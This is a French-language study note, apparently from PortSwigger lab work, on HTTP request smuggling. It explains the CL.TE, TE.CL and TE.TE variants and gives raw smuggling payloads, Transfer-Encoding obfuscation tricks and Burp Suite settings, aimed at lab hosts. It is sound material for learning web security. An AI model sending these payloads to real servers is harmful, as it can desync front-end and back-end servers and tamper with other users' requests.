# HTTP Request Smuggling

![image.png](image.png)

# Explaination

Il y a 2 moyen de transferer de la donner à un serveur Http/1:

Soit via l’entete `Content-Length` qui spécifie la taille du contenu de la requete.

```jsx
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

Soit via `Transfer-Encoding: chunked` qui fonctionne en commencant par la taille du contenu en hexadécimal (ici b car 0xb = 11) et en finissant par un 0.

```jsx
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

b
q=smuggling
0
```

Le request smuggling peut apparaitre du au fait qu’il peut y avoir pour une meme requete les 2 entetes.
Heuresement la convention fait que si les 2 entetes sont présente, la `Content-Length` doit être ignoré.

Ca fonctionne dans le cas d’un seul serveur est en jeu, mais peut créer des ambiguité si il y a plusieurs serveur en jeu, car:

- Certains serveurs ne prenennt pas en charge l’entete `Transfer-Encoding`
- Si l’entete **`Transfer-Encoding`**  est obfuscé, ca peut bypass certains serveur qui le prennent en charge

# Exploitation

Voici la maniere d’exploit cette vulnérabilité:

- **CL.TE:** Le serveur frontend utilise `Content-Length` et le serveur backend `Transfer-Encoding`
- **TE.CL**: Le serveur frontend utilise `Transfer-Encoding` et le serveur backend utilise `Content-Length`
- **TE.TE:** Les 2 serveurs utilise `Transfer-Encoding` , mais un des deux ne le comprends pas car obfusqué

## CL.TE

```jsx
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

Ici le serveur frontend va processer le `Content-Length` et estimé que la taille de la requete est 13 bytes donc jusqu’à SMUGGLED. 

Cette requete va ensuite être envoyé au serveur backend qui lui va processer jusqu’au 0.
Le reste de la requete, soit SMUGGLED va donc ensuite être envoyé dans le début de la prochaine requete.

Par exemple si on souhaite que la prochaine requete envoyé soit une requete GPOST au lieu de POST on peut envoyer un payload similaire:

```jsx
POST /post/comment HTTP/1.1
Host: 0a1400dd031f7ff9801e214500fb002a.web-security-academy.net
Cookie: session=CgcWgAPyfrG5JZpPrFQ1YJPzF7G1obUT
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Origin: https://0a1400dd031f7ff9801e214500fb002a.web-security-academy.net
Referer: https://0a1400dd031f7ff9801e214500fb002a.web-security-academy.net/post?postId=5
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
X-Pwnfox-Color: blue
Priority: u=0, i
Te: trailers
Transfer-Encoding: chunked

0

G
```

Puis la prochaine requete sera donc:

```jsx
GPOST /post/comment HTTP/1.1
...
```

## TE.CL

```jsx
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

```

> Pour faire ceci sur burpsuite, il faut d’abord envoyer la requete dans le repeteur puis aller dans le menu et désactiver l’option “Update Content-Length”

> Il faudra également mettre `\r\n\r\n` après le derniere `0` .

Ici le serveur frontend va s’arreter après le 8e bytes soit le dernier 0.

Le serveur backend lui va ensuite prendre le relais et voir que `Content-Length` est à 3 donc il va considerer que la requete est finit juste au début de la ligne contenant SMUGGLED.

(Pour rappel en HTTP un saut de ligne est composé de `\r\n` donc le serveur backend va s’arreter à `8\r\n` = 3 bytes)

```jsx
POST / HTTP/1.1
Host: 0a2c000004e31451805985f600960096.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```

## **TE.TE**

```jsx
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

Toutes ces méthode permettent d’obfusquer le header `Transfer-Encoding` il faut donc trouver ici une string qu’un des 2 serveurs ignore.
En fonction de quel serveur ignorera ca prendra la forme d’une CL.TE ou TE.CL

On peut donc obfusquer une requete de cette maniere aussi :

```jsx
POST / HTTP/1.1
Host: 0a0f00180463f45a8135b6c200970062.web-security-academy.net
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: skibidi

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

Ca fonctionne car le serveur frontend va lire les 2 headers et comprendre qu’un des 2 est invalide et lire uniquement le valide:

```jsx
Transfer-Encoding: chunked = Ok
Transfer-Encoding: skibidi = X
```

Il va donc ensuite transferer la requete au backend qui lui ne va accepté aucun des `Transfer-Encoding` car le dernier recu est invalide.

Il va donc se baser sur le Content-Length et s’arreter juste avant le GPOST.

La requete:

```jsx
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```

Va donc rester en tampon et se déclancher lors de la prochaine requete

[https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)